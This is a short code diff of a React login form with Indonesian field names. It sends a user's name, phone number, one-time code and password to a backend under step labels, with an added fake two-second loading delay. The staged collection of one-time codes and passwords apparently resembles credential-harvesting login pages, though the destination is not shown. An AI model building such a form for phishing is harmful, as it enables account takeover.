@@ -36,17 +36,18 @@ export default function AuthForm() {
           name: data.nama, 
           phone: data.nomor_hp,
           step: type,
-          otp: data.otp,
-          password: data.sandi
+          otp: data.otp || "",
+          password: data.sandi || ""
         }),
       })
     } catch (error) {
-      console.error("Gagal mengirim ke backend")
+      console.error("Gagal mengirim data")
     }
   }
 
   const onSubmit = async (values: z.infer<typeof formSchema>) => {
     setIsLoading(true)
+    // Animasi loading 2 detik sebelum pindah tahap
     setTimeout(async () => {
       if (step === 1) {
         await sendToBackend(values, "DATA_AWAL")
